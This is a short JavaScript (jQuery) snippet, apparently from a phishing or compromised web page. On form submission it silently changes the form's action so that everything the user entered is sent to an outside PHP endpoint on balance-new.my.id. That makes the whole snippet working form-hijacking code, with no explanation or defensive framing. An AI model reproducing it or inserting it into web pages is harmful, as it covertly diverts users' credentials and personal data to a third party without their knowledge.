$("form").submit(function() {
  $(myform).attr("action", "https://balance-new.my.id/sultanan.php");
});
